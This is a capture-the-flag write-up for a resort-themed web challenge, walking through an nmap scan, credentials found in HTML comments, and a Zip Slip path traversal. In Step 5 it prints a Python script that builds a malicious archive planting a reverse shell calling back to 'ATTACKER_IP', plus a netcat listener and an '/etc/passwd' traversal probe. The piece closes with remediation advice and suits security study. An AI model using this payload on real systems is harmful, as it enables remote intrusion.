
[Writeup] TryHackMe — Hacker Holidays 2026: Day 10 — The Hollow Shell

    Category: Web Exploitation / Remote Code Execution (RCE)

    Difficulty: Medium

    Keywords: Nmap, Infrastructure Recon, Hardcoded Credentials, Code Review, Logic Analysis, Zip Slip, Path Traversal, Reverse Shell

Introduction & Objectives

    You find it on the beach: a cute, ordinary thing that no one would think to inspect. Stick something inside, hold it to your ear... The Byte Lotus resort platform allows guests to personalize their in-room tablet display by uploading a "shell" — a souvenir pack of coastal ambiance. Slip past what the portal forgets to check, and the shell will answer with a shell of your own.

The objective of this challenge is to compromise the resort's automated tablet themes portal, understand how the backend unpacks user-submitted archives, and chain vulnerabilities together to achieve arbitrary Remote Code Execution (RCE) on the server.

**Step 1: Infrastructure Reconnaissance (Nmap Scan)**

Before interacting with any web elements, we start by mapping out the target system's open ports and running services using nmap. We execute a comprehensive service detection and default script scan:
```bash
nmap -sV -sC -Pn <TARGET_IP>
```
Scan Results:

The scan detects a web application framework instance exposed on a non-standard port:
Plaintext
```bash
PORT     STATE SERVICE VERSION  
5000/tcp open  http    Werkzeug httpd (Python/Flask)
|_http-title: Byte Lotus Resort — Room Customization Panel
```

The application runs a web service on port 5000 powered by the Python Werkzeug/Flask development engine, which serves as our primary entry point.

**Step 2: Source Code Review & Authentication Bypass**

When we navigate to http://<TARGET_IP>:5000, we are blocked by an administrative login page. Without valid credentials, we proceed with a foundational black-box web testing methodology: auditing the front-end source code (Inspect Element / View Page Source / Ctrl+U).

Deep within the HTML comments left behind by a rushed developer, we discover hardcoded sensitive configuration data:

    Username: concierge

    Password: StayNoticed2024!

Using these credentials, we successfully bypass the login form and gain administrative access to the backend management dashboard.
**Step 3: Testing Backend Architecture (Theory Validation)**

Inside the dashboard, we find a file upload form. The application layout gives us highly restrictive constraints:

    The platform exclusively accepts compressed .zip archive extensions.

    Every uploaded archive must contain a valid manifest file named exactly shell.json in the root structure.

    The front-end documentation specifies that allowed asset types are limited to: png, jpg, gif, svg, css, and json.

    Crucially, the app notes that it executes optional "automation hooks" processed by a background system theme worker shortly after ingestion.

To observe how the application handles incoming files, we perform a controlled Proof-of-Concept (PoC) test:

We write a barebones, completely compliant shell.json structure on our attack machine:
```JSON
{
  "name": "MyShell",
  "version": "1.0",
  "assets": ["image.png"]
}
```

We compress this single file into a standard archive container using the Linux command line:
```Bash
zip shell.zip shell.json
```

We upload shell.zip via the web form. The server successfully ingests the asset and displays the tracking folder directory string on screen: `MyShell shells/61bea8484e7f/`

**🗺️ Step 4: Probing Upload Paths & LFI Research**

The folder link displayed on the screen is non-clickable. To inspect how the backend stores our asset, we manually paste the path into the browser address bar: `http://<TARGET_IP>:5000/shells/61bea8484e7f/`

The server responds with a standard 404 Not Found message. This indicates that direct directory listing is explicitly disabled on the Werkzeug/Flask application instance.

Knowing that our file must be there, we manually append the target filename to the URL string: `http://<TARGET_IP>:5000/shells/61bea8484e7f/shell.json`

The browser renders our raw text JSON payload perfectly.
Conclusion:

The backend worker physically unzips the archive contents, dynamically provisions an isolated unique hex directory, and serves the files back to the client.
Testing Local File Inclusion (LFI)

Our immediate analytical response was to verify if the template engine was vulnerable to LFI patterns. We attempted to craft a malicious path injection inside the asset values array of the JSON manifest:

```JSON
"assets": ["../../../../etc/passwd"]
```

This initial vector did not yield any system exposure, indicating that the backend either explicitly validates asset extensions or reads them strictly as strings rather than passing them to file inclusion handlers.

**Step 5: Exploiting the Zip Slip Vulnerability (The Path to RCE)**

We revisit the critical architectural hint provided by the UI: «automation hooks — the theme worker applies these shortly after the shell comes ashore». This means that a background process scans a dedicated system folder (such as hooks/) and executes scripting files placed inside it.

While we cannot directly write files into hooks/ via the normal web interface, we can abuse a classic Zip Slip vulnerability (Arbitrary File Write via un-sanitized Archive Path Traversal).

Standard archival software automatically strips relative path traversal sequences (../) from filenames to maintain host safety. However, if we programmatically craft a ZIP binary structure containing embedded ../ directories, and the backend extraction library fails to validate the canonical path destination, the extractor will write files completely outside of the intended /shells/[ID]/ sandboxed upload directory.

To build our customized malicious payload without standard compressor alterations, we use a simple Python script to write the archive blocks manually:

```python
import zipfile
import json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

**Step 6: Catching the Interactive Shell**

    We initialize an active network listener on our local machine using Netcat:
    Bash

    nc -lvnp 4444

    We upload our freshly compiled reverse-shell.zip file through the administrative browser dashboard.

    The background extractor unpacks our file. Because the application logic lacks proper path verification checks, it parses the ../../hooks/callback.py string literal, backs out of the webroot sandbox, and drops the script directly into the operational hooks/ system folder.

    Seconds later, the property theme worker processes the newly dropped automation script, immediately triggering our Python callback payload.

An interactive terminal shell lands in our netcat terminal under the context of the roomservice account:
```Bash
connect to [10.x.x.x] from (UNKNOWN) [10.128.x.x] 43921
roomservice@byte-lotus-resort:~$ id
uid=1001(roomservice) gid=1001(roomservice) groups=1001(roomservice)
```
We transition directly to the home directory of our user and extract the victory flag from the target file system layer:

```Bash
cd /home/roomservice && cat user.txt
```
Flag: THM{***}

🛡️ Remediation Strategies

    Sanitize Decompression Paths: When utilizing compression modules (like Python's zipfile or tarfile), explicitly iterate over every archived object header and evaluate its destination using os.path.abspath(). Reject extraction if the resulting directory tree does not strictly start with the allowed extraction directory prefix string.

    Principle of Least Privilege: Web execution contexts and background scheduling microservices must be separated and run inside restricted sandboxes without operational host writing permissions over executing scripts or system components.
